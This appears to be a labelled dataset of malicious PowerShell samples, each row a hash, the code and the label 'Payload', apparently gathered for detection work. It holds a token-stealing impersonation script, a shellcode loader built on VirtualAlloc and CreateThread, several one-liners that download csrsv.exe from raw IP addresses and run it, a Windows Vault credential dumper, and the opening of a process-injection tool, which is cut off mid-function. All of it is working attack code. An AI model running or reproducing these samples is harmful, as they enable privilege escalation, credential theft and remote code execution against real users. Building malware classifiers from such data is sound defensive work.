        $systemTokenInfo = Get-PrimaryToken -ProcessId (Get-Process wininit | where {$_.SessionId -eq 0}).Id
        if ($systemTokenInfo -eq $null -or (-not (Invoke-ImpersonateUser -hToken $systemTokenInfo.hProcToken)))
        {
            Write-Warning ""Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens""
        }

        if ($systemTokenInfo -ne $null -and $systemTokenInfo.hProcToken -ne [IntPtr]::Zero)
        {
            $CloseHandle.Invoke($systemTokenInfo.hProcToken) | Out-Null
            $systemTokenInfo = $null
        }

        $ProcessIds = get-process | where {$_.name -inotmatch ""^csrss$"" -and $_.name -inotmatch ""^system$"" -and $_.id -ne 0}

        
        foreach ($Process in $ProcessIds)
        {
            $PrimaryTokenInfo = (Get-PrimaryToken -ProcessId $Process.Id -FullPrivs)

            
            if ($PrimaryTokenInfo -ne $null)
            {
                [IntPtr]$hToken = [IntPtr]$PrimaryTokenInfo.hProcToken

                if ($hToken -ne [IntPtr]::Zero)
                {
                    
                    $ReturnObj = Get-TokenInformation -hToken $hToken
                    if ($ReturnObj -ne $null)
                    {
                        $ReturnObj | Add-Member -MemberType NoteProperty -Name ProcessId -Value $Process.Id

                        $AllTokens += $ReturnObj
                    }
                }
                else
                {
                    Write-Warning ""Couldn't retrieve token for Process: $($Process.Name). ProcessId: $($Process.Id)""
                }

                foreach ($Thread in $Process.Threads)
                {
                    $ThreadTokenInfo = Get-ThreadToken -ThreadId $Thread.Id
                    [IntPtr]$hToken = ($ThreadTokenInfo.hThreadToken)

                    if ($hToken -ne [IntPtr]::Zero)
                    {
                        $ReturnObj = Get-TokenInformation -hToken $hToken
                        if ($ReturnObj -ne $null)
                        {
                            $ReturnObj | Add-Member -MemberType NoteProperty -Name ThreadId -Value $Thread.Id
                    
                            $AllTokens += $ReturnObj
                        }
                    }
                }
            }
        }

        return $AllTokens
    }


    function Invoke-RevertToSelf
    {
        Param(
            [Parameter(Position=0)]
            [Switch]
            $ShowOutput
        )

        $Success = $RevertToSelf.Invoke()

        if ($ShowOutput)
        {
            if ($Success)
            {
                Write-Output ""RevertToSelf was successful. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)""
            }
            else
            {
                Write-Output ""RevertToSelf failed. Running as: $([Environment]::UserDomainName)\$([Environment]::UserName)""
            }
        }
    }


    
    function Main
    {
        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] ""Administrator""))
        {
            Write-Error ""Script must be run as administrator"" -ErrorAction Stop
        }

        
        if ([System.Diagnostics.Process]::GetCurrentProcess().SessionId -eq 0)
        {
            Write-Verbose ""Running in Session 0, forcing NoUI (processes in Session 0 cannot have a UI)""
            $NoUI = $true
        }

        if ($PsCmdlet.ParameterSetName -ieq ""RevToSelf"")
        {
            Invoke-RevertToSelf -ShowOutput
        }
        elseif ($PsCmdlet.ParameterSetName -ieq ""CreateProcess"" -or $PsCmdlet.ParameterSetName -ieq ""ImpersonateUser"")
        {
            $AllTokens = Enum-AllTokens
            
            
            [IntPtr]$hToken = [IntPtr]::Zero
            $UniqueTokens = (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser
            if ($Username -ne $null -and $Username -ne '')
            {
                if ($UniqueTokens.ContainsKey($Username))
                {
                    $hToken = $UniqueTokens[$Username].hToken
                    Write-Verbose ""Selecting token by username""
                }
                else
                {
                    Write-Error ""A token belonging to the specified username was not found. Username: $($Username)"" -ErrorAction Stop
                }
            }
            elseif ( $ProcessId -ne $null -and $ProcessId -ne 0)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | Get-Member ProcessId) -and $Token.ProcessId -eq $ProcessId)
                    {
                        $hToken = $Token.hToken
                        Write-Verbose ""Selecting token by ProcessID""
                    }
                }

                if ($hToken -eq [IntPtr]::Zero)
                {
                    Write-Error ""A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened."" -ErrorAction Stop
                }
            }
            elseif ($ThreadId -ne $null -and $ThreadId -ne 0)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | Get-Member ThreadId) -and $Token.ThreadId -eq $ThreadId)
                    {
                        $hToken = $Token.hToken
                        Write-Verbose ""Selecting token by ThreadId""
                    }
                }

                if ($hToken -eq [IntPtr]::Zero)
                {
                    Write-Error ""A token belonging to ThreadId $($ThreadId) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened."" -ErrorAction Stop
                }
            }
            elseif ($Process -ne $null)
            {
                foreach ($Token in $AllTokens)
                {
                    if (($Token | Get-Member ProcessId) -and $Token.ProcessId -eq $Process.Id)
                    {
                        $hToken = $Token.hToken
                        Write-Verbose ""Selecting token by Process object""
                    }
                }

                if ($hToken -eq [IntPtr]::Zero)
                {
                    Write-Error ""A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened."" -ErrorAction Stop
                }
            }
            else
            {
                Write-Error ""Must supply a Username, ProcessId, ThreadId, or Process object""  -ErrorAction Stop
            }

            
            if ($PsCmdlet.ParameterSetName -ieq ""CreateProcess"")
            {
                if (-not $NoUI)
                {
                    Set-DesktopACLs
                }

                Create-ProcessWithToken -hToken $hToken -ProcessName $CreateProcess -ProcessArgs $ProcessArgs -PassThru:$PassThru

                Invoke-RevertToSelf
            }
            elseif ($ImpersonateUser)
            {
                Invoke-ImpersonateUser -hToken $hToken | Out-Null
                Write-Output ""Running As: $([Environment]::UserDomainName)\$([Environment]::UserName)""
            }

            Free-AllTokens -TokenInfoObjs $AllTokens
        }
        elseif ($PsCmdlet.ParameterSetName -ieq ""WhoAmI"")
        {
            Write-Output ""$([Environment]::UserDomainName)\$([Environment]::UserName)""
        }
        else 
        {
            $AllTokens = Enum-AllTokens

            if ($PsCmdlet.ParameterSetName -ieq ""ShowAll"")
            {
                Write-Output $AllTokens
            }
            else
            {
                Write-Output (Get-UniqueTokens -AllTokens $AllTokens).TokenByUser.Values
            }

            Invoke-RevertToSelf

            Free-AllTokens -TokenInfoObjs $AllTokens
        }
    }


    
    Main
}
",Payload
43592fa6f341a19d4e04901d3a6126a00d545b40a5f85bb707037d77958f95b1,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0xd4,0x30,0x0c,0x92,0xda,0xc5,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x0f,0x03,0x56,0xdb,0xd2,0xf9,0x6e,0x0b,0x90,0x02,0x8f,0xcb,0xf5,0x8b,0x6a,0xfa,0x35,0xef,0xff,0xac,0x85,0x7b,0xad,0x40,0x6d,0x29,0x46,0xd3,0x03,0xe6,0x69,0x54,0xa9,0xd0,0x44,0x65,0x82,0x21,0xc6,0xe5,0xd9,0x75,0x28,0xd4,0x11,0x88,0x29,0x11,0x4f,0x61,0x7b,0xca,0x1b,0xd4,0x6c,0x7f,0x51,0xe5,0x07,0x33,0x77,0x6d,0xfb,0x83,0x76,0x5c,0xaa,0x98,0x20,0x7e,0x4c,0x4d,0x59,0x37,0x56,0x92,0x64,0x81,0xed,0x60,0x12,0x10,0x24,0xb9,0xdb,0xbf,0x09,0x76,0x2e,0xc1,0x4e,0xb0,0xd1,0xb4,0xa6,0xc3,0x6c,0xcf,0x7c,0xbe,0xaa,0x5a,0x67,0x18,0x38,0xfc,0x43,0x99,0xed,0x9b,0x00,0x95,0x5a,0xef,0x4f,0xb9,0x5d,0x3c,0xe4,0xc5,0xd6,0xc3,0x2b,0x4c,0xac,0xe7,0xef,0x15,0x76,0x89,0xb6,0xf3,0xd9,0xb6,0xa9,0x5c,0x85,0x12,0xa1,0x70,0xd2,0x2e,0xe8,0x1c,0x17,0x03,0x13,0xdc,0x3f,0x14,0x60,0xee,0xe0,0x8e,0xee,0x42,0x68,0x09,0xe8,0xa5,0x43,0xed,0x66,0x58,0x6c,0x0e,0xae,0x9e,0x38,0x5e,0xd8,0x37,0x41,0x35,0x18,0xb8,0x94,0xa0,0x1d,0x2e,0x39,0x41,0xc8,0x57,0x2d,0xab,0xf4,0xb6,0xf2,0x22,0x12,0xe8,0x5a,0x65,0x8b,0x48,0x0b,0xc5,0x7b,0x20,0x41,0xca,0xa4,0x50,0x6a,0x00,0xcd,0xfa,0x85,0xfd,0xa5,0x92,0x3c,0xa4,0x3e,0x03,0xc0,0x72,0x3b,0x03,0x4a,0x71,0xbb,0xcd,0xbb,0xfc,0xaf,0xb9,0x4b,0x4b,0x8d,0x6f,0x53,0x61,0xb8,0x8f,0xc1,0x8e,0x6b,0xd8,0x7d,0x8d,0x4a,0x2e,0x22,0x6e,0xb9,0x25,0xeb,0xfa,0x02,0x51,0x14,0xeb,0x82,0xa1,0x42,0x61,0x83,0xc9,0x32,0xd1,0xd0,0xec,0x3c,0xcc,0x44,0xbd,0xa8,0xef,0x3c,0x12,0x7a,0x98,0xc2,0x4d,0x4c,0x07,0x3c,0xb8,0x4c,0x7b,0xeb,0x84,0x3a,0x95,0x2f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
7347d4c91d2961086d51666c685a45190d36c32a48f33c861fcc60e7254b2b8d,"
(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
b6661bc9233551fb07b96d78c87917d5534e1f0eb1be25894eb5b5c9be7bd767,"
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',""$env:APPDATA\csrsv.exe"");Start-Process (""$env:APPDATA\csrsv.exe"")

",Payload
a59ee852d8b7cb46d53f028404d469a9d0879b3d74f9693bc18f61902cb38b53,"function Get-VaultCredential
{

    [CmdletBinding()] Param()

    $OSVersion = [Environment]::OSVersion.Version
    $OSMajor = $OSVersion.Major
    $OSMinor = $OSVersion.Minor

    
    $DynAssembly = New-Object System.Reflection.AssemblyName('VaultUtil')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('VaultUtil', $False)

    $EnumBuilder = $ModuleBuilder.DefineEnum('VaultLib.VAULT_ELEMENT_TYPE', 'Public', [Int32])
    $null = $EnumBuilder.DefineLiteral('Undefined', -1)
    $null = $EnumBuilder.DefineLiteral('Boolean', 0)
    $null = $EnumBuilder.DefineLiteral('Short', 1)
    $null = $EnumBuilder.DefineLiteral('UnsignedShort', 2)
    $null = $EnumBuilder.DefineLiteral('Int', 3)
    $null = $EnumBuilder.DefineLiteral('UnsignedInt', 4)
    $null = $EnumBuilder.DefineLiteral('Double', 5)
    $null = $EnumBuilder.DefineLiteral('Guid', 6)
    $null = $EnumBuilder.DefineLiteral('String', 7)
    $null = $EnumBuilder.DefineLiteral('ByteArray', 8)
    $null = $EnumBuilder.DefineLiteral('TimeStamp', 9)
    $null = $EnumBuilder.DefineLiteral('ProtectedArray', 10)
    $null = $EnumBuilder.DefineLiteral('Attribute', 11)
    $null = $EnumBuilder.DefineLiteral('Sid', 12)
    $null = $EnumBuilder.DefineLiteral('Last', 13)
    $VAULT_ELEMENT_TYPE = $EnumBuilder.CreateType()

    $EnumBuilder = $ModuleBuilder.DefineEnum('VaultLib.VAULT_SCHEMA_ELEMENT_ID', 'Public', [Int32])
    $null = $EnumBuilder.DefineLiteral('Illegal', 0)
    $null = $EnumBuilder.DefineLiteral('Resource', 1)
    $null = $EnumBuilder.DefineLiteral('Identity', 2)
    $null = $EnumBuilder.DefineLiteral('Authenticator', 3)
    $null = $EnumBuilder.DefineLiteral('Tag', 4)
    $null = $EnumBuilder.DefineLiteral('PackageSid', 5)
    $null = $EnumBuilder.DefineLiteral('AppStart', 100)
    $null = $EnumBuilder.DefineLiteral('AppEnd', 10000)
    $VAULT_SCHEMA_ELEMENT_ID = $EnumBuilder.CreateType()

    $LayoutConstructor = [Runtime.InteropServices.StructLayoutAttribute].GetConstructor([Runtime.InteropServices.LayoutKind])
    $CharsetField = [Runtime.InteropServices.StructLayoutAttribute].GetField('CharSet')
    $StructLayoutCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($LayoutConstructor,
                                                                                     @([Runtime.InteropServices.LayoutKind]::Explicit),
                                                                                     $CharsetField,
                                                                                     @([Runtime.InteropServices.CharSet]::Ansi))
    $StructAttributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'

    $TypeBuilder = $ModuleBuilder.DefineType('VaultLib.VAULT_ITEM', $StructAttributes, [Object], [System.Reflection.Emit.PackingSize]::Size4)
    $null = $TypeBuilder.DefineField('SchemaId', [Guid], 'Public')
    $null = $TypeBuilder.DefineField('pszCredentialFriendlyName', [IntPtr], 'Public')
    $null = $TypeBuilder.DefineField('pResourceElement', [IntPtr], 'Public')
    $null = $TypeBuilder.DefineField('pIdentityElement', [IntPtr], 'Public')
    $null = $TypeBuilder.DefineField('pAuthenticatorElement', [IntPtr], 'Public')
    if ($OSMajor -ge 6 -and $OSMinor -ge 2)
    {
        $null = $TypeBuilder.DefineField('pPackageSid', [IntPtr], 'Public')
    }
    $null = $TypeBuilder.DefineField('LastModified', [UInt64], 'Public')
    $null = $TypeBuilder.DefineField('dwFlags', [UInt32], 'Public')
    $null = $TypeBuilder.DefineField('dwPropertiesCount', [UInt32], 'Public')
    $null = $TypeBuilder.DefineField('pPropertyElements', [IntPtr], 'Public')
    $VAULT_ITEM = $TypeBuilder.CreateType()

    $TypeBuilder = $ModuleBuilder.DefineType('VaultLib.VAULT_ITEM_ELEMENT', $StructAttributes)
    $TypeBuilder.SetCustomAttribute($StructLayoutCustomAttribute)
    $null = $TypeBuilder.DefineField('SchemaElementId', $VAULT_SCHEMA_ELEMENT_ID, 'Public').SetOffset(0)
    $null = $TypeBuilder.DefineField('Type', $VAULT_ELEMENT_TYPE, 'Public').SetOffset(8)
    $VAULT_ITEM_ELEMENT = $TypeBuilder.CreateType()


    $TypeBuilder = $ModuleBuilder.DefineType('VaultLib.Vaultcli', 'Public, Class')
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultOpenVault',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([Guid].MakeByRefType(),
                                                                 [UInt32],
                                                                 [IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultCloseVault',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultFree',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([IntPtr]),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultEnumerateVaults',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([Int32],
                                                                 [Int32].MakeByRefType(),
                                                                 [IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultEnumerateItems',
                                                      'vaultcli.dll',
                                                      'Public, Static',
                                                      [Reflection.CallingConventions]::Standard,
                                                      [Int32],
                                                      [Type[]] @([IntPtr],
                                                                 [Int32],
                                                                 [Int32].MakeByRefType(),
                                                                 [IntPtr].MakeByRefType()),
                                                      [Runtime.InteropServices.CallingConvention]::Winapi,
                                                      [Runtime.InteropServices.CharSet]::Auto)

    if ($OSMajor -ge 6 -and $OSMinor -ge 2)
    {
        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultGetItem',
                                                          'vaultcli.dll',
                                                          'Public, Static',
                                                          [Reflection.CallingConventions]::Standard,
                                                          [Int32],
                                                          [Type[]] @([IntPtr],
                                                                     [Guid].MakeByRefType(),
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [Int32],
                                                                     [IntPtr].MakeByRefType()),
                                                          [Runtime.InteropServices.CallingConvention]::Winapi,
                                                          [Runtime.InteropServices.CharSet]::Auto)
    }
    else
    {
        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VaultGetItem',
                                                          'vaultcli.dll',
                                                          'Public, Static',
                                                          [Reflection.CallingConventions]::Standard,
                                                          [Int32],
                                                          [Type[]] @([IntPtr],
                                                                     [Guid].MakeByRefType(),
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [Int32],
                                                                     [IntPtr].MakeByRefType()),
                                                          [Runtime.InteropServices.CallingConvention]::Winapi,
                                                          [Runtime.InteropServices.CharSet]::Auto)
    }

    $Vaultcli = $TypeBuilder.CreateType()
    

    
    function local:Get-VaultElementValue
    {
        Param (
            [ValidateScript({$_ -ne [IntPtr]::Zero})]
            [IntPtr]
            $VaultElementPtr
        )

        $PartialElement = [Runtime.InteropServices.Marshal]::PtrToStructure($VaultElementPtr, [Type] $VAULT_ITEM_ELEMENT)
        $ElementPtr = [IntPtr] ($VaultElementPtr.ToInt64() + 16)

        switch ($PartialElement.Type)
        {
            $VAULT_ELEMENT_TYPE::String {
                $StringPtr = [Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr] $ElementPtr)
                [Runtime.InteropServices.Marshal]::PtrToStringUni([IntPtr] $StringPtr)
            }

            $VAULT_ELEMENT_TYPE::Boolean {
                [Bool] [Runtime.InteropServices.Marshal]::ReadByte([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::Short {
                [Runtime.InteropServices.Marshal]::ReadInt16([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::UnsignedShort {
                [Runtime.InteropServices.Marshal]::ReadInt16([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::Int {
                [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::UnsignedInt {
                [Runtime.InteropServices.Marshal]::ReadInt32([IntPtr] $ElementPtr)
            }

            $VAULT_ELEMENT_TYPE::Double {
                [Runtime.InteropServices.Marshal]::PtrToStructure($ElementPtr, [Type] [Double])
            }

            $VAULT_ELEMENT_TYPE::Guid {
                [Runtime.InteropServices.Marshal]::PtrToStructure($ElementPtr, [Type] [Guid])
            }

            $VAULT_ELEMENT_TYPE::Sid {
                $SidPtr = [Runtime.InteropServices.Marshal]::ReadIntPtr([IntPtr] $ElementPtr)
                Write-Verbose ""0x$($SidPtr.ToString('X8'))""
                $SidObject = [Security.Principal.SecurityIdentifier] ([IntPtr] $SidPtr)
                $SidObject.Value
            }

            
            
            $VAULT_ELEMENT_TYPE::ByteArray { $null }
            $VAULT_ELEMENT_TYPE::TimeStamp { $null }
            $VAULT_ELEMENT_TYPE::ProtectedArray { $null }
            $VAULT_ELEMENT_TYPE::Attribute { $null }
            $VAULT_ELEMENT_TYPE::Last { $null }
        }
    }

    $VaultCount = 0
    $VaultGuidPtr = [IntPtr]::Zero
    $Result = $Vaultcli::VaultEnumerateVaults(0, [Ref] $VaultCount, [Ref] $VaultGuidPtr)

    if ($Result -ne 0)
    {
        throw ""Unable to enumerate vaults. Error (0x$($Result.ToString('X8')))""
    }

    $GuidAddress = $VaultGuidPtr

    $VaultSchema = @{
        ([Guid] '2F1A6504-0641-44CF-8BB5-3612D865F2E5') = 'Windows Secure Note'
        ([Guid] '3CCD5499-87A8-4B10-A215-608888DD3B55') = 'Windows Web Password Credential'
        ([Guid] '154E23D0-C644-4E6F-8CE6-5069272F999F') = 'Windows Credential Picker Protector'
        ([Guid] '4BF4C442-9B8A-41A0-B380-DD4A704DDB28') = 'Web Credentials'
        ([Guid] '77BC582B-F0A6-4E15-4E80-61736B6F3B29') = 'Windows Credentials'
        ([Guid] 'E69D7838-91B5-4FC9-89D5-230D4D4CC2BC') = 'Windows Domain Certificate Credential'
        ([Guid] '3E0E35BE-1B77-43E7-B873-AED901B6275B') = 'Windows Domain Password Credential'
        ([Guid] '3C886FF3-2669-4AA2-A8FB-3F6759A77548') = 'Windows Extended Credential'
        ([Guid] '00000000-0000-0000-0000-000000000000') = $null
    }

    if ($VaultCount)
    {
        foreach ($i in 1..$VaultCount)
        {
            $VaultGuid = [Runtime.InteropServices.Marshal]::PtrToStructure($GuidAddress, [Type] [Guid])
            $GuidAddress = [IntPtr] ($GuidAddress.ToInt64() + [Runtime.InteropServices.Marshal]::SizeOf([Type] [Guid]))

            $VaultHandle = [IntPtr]::Zero

            Write-Verbose ""Opening vault - $($VaultSchema[$VaultGuid]) ($($VaultGuid))""

            $Result = $Vaultcli::VaultOpenVault([Ref] $VaultGuid, 0, [Ref] $VaultHandle)

            if ($Result -ne 0)
            {
                Write-Error ""Unable to open the following vault: $($VaultSchema[$VaultGuid]). Error (0x$($Result.ToString('X8')))""
                continue
            }

            $VaultItemCount = 0
            $VaultItemPtr = [IntPtr]::Zero

            $Result = $Vaultcli::VaultEnumerateItems($VaultHandle, 512, [Ref] $VaultItemCount, [Ref] $VaultItemPtr)

            if ($Result -ne 0)
            {
                $null = $Vaultcli::VaultCloseVault([Ref] $VaultHandle)
                Write-Error ""Unable to enumerate vault items from the following vault: $($VaultSchema[$VaultGuid]). Error (0x$($Result.ToString('X8')))""
                continue
            }

            $StructAddress = $VaultItemPtr

            if ($VaultItemCount)
            {
                foreach ($j in 1..$VaultItemCount)
                {
                    $CurrentItem = [Runtime.InteropServices.Marshal]::PtrToStructure($StructAddress, [Type] $VAULT_ITEM)
                    $StructAddress = [IntPtr] ($StructAddress.ToInt64() + [Runtime.InteropServices.Marshal]::SizeOf([Type] $VAULT_ITEM))

                    $PasswordVaultItem = [IntPtr]::Zero

                    if ($OSMajor -ge 6 -and $OSMinor -ge 2)
                    {
                        $Result = $Vaultcli::VaultGetItem($VaultHandle,
                                                          [Ref] $CurrentItem.SchemaId,
                                                          $CurrentItem.pResourceElement,
                                                          $CurrentItem.pIdentityElement,
                                                          $CurrentItem.pPackageSid,
                                                          [IntPtr]::Zero,
                                                          0,
                                                          [Ref] $PasswordVaultItem)
                    }
                    else
                    {
                        $Result = $Vaultcli::VaultGetItem($VaultHandle,
                                                          [Ref] $CurrentItem.SchemaId,
                                                          $CurrentItem.pResourceElement,
                                                          $CurrentItem.pIdentityElement,
                                                          [IntPtr]::Zero,
                                                          0,
                                                          [Ref] $PasswordVaultItem)
                    }

                    $PasswordItem = $null

                    if ($Result -ne 0)
                    {
                        Write-Error ""Error occured retrieving vault item. Error (0x$($Result.ToString('X8')))""
                        continue
                    }
                    else
                    {
                        $PasswordItem = [Runtime.InteropServices.Marshal]::PtrToStructure($PasswordVaultItem, [Type] $VAULT_ITEM)
                    }

                    if ($VaultSchema.ContainsKey($VaultGuid))
                    {
                        $VaultType = $VaultSchema[$VaultGuid]
                    }
                    else
                    {
                        $VaultType = $VaultGuid
                    }

                    if ($PasswordItem.pAuthenticatorElement -ne [IntPtr]::Zero)
                    {
                        $Credential = Get-VaultElementValue $PasswordItem.pAuthenticatorElement
                    }
                    else
                    {
                        $Credential = $null
                    }

                    $PackageSid = $null

                    if ($CurrentItem.pPackageSid -and ($CurrentItem.pPackageSid -ne [IntPtr]::Zero))
                    {
                        $PackageSid = Get-VaultElementValue $CurrentItem.pPackageSid
                    }


                    $Properties = @{
                        Vault = $VaultType
                        Resource = if ($CurrentItem.pResourceElement) { Get-VaultElementValue $CurrentItem.pResourceElement } else { $null }
                        Identity = if ($CurrentItem.pIdentityElement) { Get-VaultElementValue $CurrentItem.pIdentityElement } else { $null }
                        PackageSid = $PackageSid
                        Credential = $Credential
                        LastModified = [DateTime]::FromFileTimeUtc($CurrentItem.LastModified)
                    }

                    $VaultItem = New-Object PSObject -Property $Properties
                    $VaultItem.PSObject.TypeNames[0] = 'VAULTCLI.VAULTITEM'

                    $VaultItem

                    $null = $Vaultcli::VaultFree($PasswordVaultItem)
                }
            }

            $null = $Vaultcli::VaultCloseVault([Ref] $VaultHandle)
        }
    }
}",Payload
8b84eb0f3ace57e53ba380f9ef85abcd3ce01eb5b40c83dd88335e44ad81a5c3,"function Invoke-PSInject
{
 


[CmdletBinding(DefaultParameterSetName=""WebFile"")]
Param(
    
    [Parameter(Position = 1)]
    [String[]]
    $ComputerName,
    
    [Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void', 'Other' )]
    [String]
    $FuncReturnType = 'Other',
    
    [Parameter(Position = 3)]
    [String]
    $ExeArgs,
    
    [Parameter(Position = 4)]
    [Int32]
    $ProcId,
    
    [Parameter(Position = 5)]
    [String]
    $ProcName,
    
    [Parameter(Position = 6, Mandatory = $true)]
    [ValidateLength(1,5952)]
    [String]
    $PoshCode,

    [Parameter(Position = 7)]
    [Switch]
    $ForceASLR
)

    Set-StrictMode -Version 2

    
    $PoshCode = [System.Text.Encoding]::UNICODE.GetString([System.Convert]::FromBase64String($PoshCode));

    function Invoke-PatchDll {
        

        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            $DllBytes,

            [Parameter(Mandatory = $True)]
            [string]
            $FindString,

            [Parameter(Mandatory = $True)]
            [string]
            $ReplaceString
        )

        $FindStringBytes = ([system.Text.Encoding]::UNICODE).GetBytes($FindString)
        $ReplaceStringBytes = ([system.Text.Encoding]::UNICODE).GetBytes($ReplaceString)

        $index = 0
        $s = [System.Text.Encoding]::UNICODE.GetString($DllBytes)
        $index = $s.IndexOf($FindString) * 2
        Write-Verbose ""patch index: $index""

        if($index -eq 0)
        {
            throw(""Could not find string $FindString !"")
        }

        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++)
        {
            $DllBytes[$index+$i]=$ReplaceStringBytes[$i]
        }

        
        $DllBytes[$index+$ReplaceStringBytes.Length] = [byte]0x00
        $DllBytes[$index+$ReplaceStringBytes.Length+1] = [byte]0x00

        $replacestart = $index
        $replaceend = $index + $ReplaceStringBytes.Length
        write-verbose ""replacestart: $replacestart""
        write-verbose ""replaceend: $replaceend""

        $NewCode=[System.Text.Encoding]::Unicode.GetString($RawBytes[$replacestart..$replaceend])
        write-verbose ""Replaced pattern with: $NewCode""
        
        return $DllBytes
    }


$RemoteScriptBlock = {
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $PEBytes64,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $PEBytes32,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FuncReturnType,
                
        [Parameter(Position = 2, Mandatory = $true)]
        [Int32]
        $ProcId,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR,
        
        [Parameter(Position = 5, Mandatory = $true)]
        [String]
        $PoshCode
    )
    
    
    
    
    Function Get-Win32Types
    {
        $Win32Types = New-Object System.Object

        
        
        $Domain = [AppDomain]::CurrentDomain
        $DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
        $ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


        
        
        $TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
        $TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
        $TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
        $TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
        $TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
        $MachineType = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

        
        $TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
